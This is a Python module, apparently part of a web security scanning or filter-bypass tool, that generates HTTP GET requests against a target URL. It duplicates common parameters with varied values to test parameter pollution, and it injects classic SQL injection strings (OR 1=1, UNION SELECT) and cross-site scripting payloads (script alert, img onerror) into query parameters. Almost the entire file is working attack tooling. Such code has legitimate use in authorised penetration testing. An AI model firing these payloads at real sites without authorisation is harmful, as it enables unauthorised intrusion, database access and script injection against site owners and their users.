#!/usr/bin/env python3
"""
Parameter pollution bypass techniques
"""

import urllib.parse

class ParameterPollution:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate parameter pollution tests"""
        tests = []
        base_url = self.manager.target_url
        
        # Common parameters
        params = [
            'id', 'page', 'file', 'dir', 'path', 'include', 'template',
            'view', 'action', 'mode', 'debug', 'test', 'admin',
            'user', 'pass', 'key', 'token', 'session', 'lang',
            'locale', 'theme', 'style', 'format', 'type',
            'category', 'section', 'module', 'controller', 'method',
            'function', 'process', 'step', 'stage', 'level'
        ]
        
        # Pollute with different values
        values = [
            '1', '0', 'true', 'false', 'admin', 'test', 'bypass',
            'debug', 'yes', 'no', 'on', 'off', 'enable', 'disable',
            'production', 'development', 'staging', 'testing'
        ]
        
        # Generate pollution tests
        for param in params:
            for value in values:
                # Duplicate parameter
                url = base_url + '?' + param + '=' + value + '&' + param + '=' + value[::-1]
                tests.append({
                    'name': f'Parameter Pollution: {param}={value}',
                    'url': url,
                    'headers': {},
                    'method': 'GET'
                })
                
                # Different order
                url = base_url + '?' + param + '=' + value[::-1] + '&' + param + '=' + value
                tests.append({
                    'name': f'Parameter Pollution Reverse: {param}={value}',
                    'url': url,
                    'headers': {},
                    'method': 'GET'
                })
                
                # With array syntax
                url = base_url + '?' + param + '[]=' + value + '&' + param + '[]=' + value[::-1]
                tests.append({
                    'name': f'Array Pollution: {param}[]={value}',
                    'url': url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # SQL injection pollution
        sql_payloads = [
            "1' OR '1'='1",
            "1' AND '1'='1",
            "1' OR 1=1--",
            "1' AND 1=1--",
            "' OR 'x'='x",
            "' OR '1'='1'--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--",
        ]
        
        for payload in sql_payloads:
            for param in ['id', 'user', 'page', 'file']:
                url = base_url + '?' + param + '=' + urllib.parse.quote(payload)
                tests.append({
                    'name': f'SQL Pollution: {param}={payload[:20]}...',
                    'url': url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # XSS pollution
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            'onerror=alert(1)',
            'onload=alert(1)',
            '<img src=x onerror=alert(1)>',
        ]
        
        for payload in xss_payloads:
            for param in ['q', 'search', 'query', 's']:
                url = base_url + '?' + param + '=' + urllib.parse.quote(payload)
                tests.append({
                    'name': f'XSS Pollution: {param}={payload[:20]}...',
                    'url': url,
                    'headers': {},
                    'method': 'GET'
                })
        
        return tests
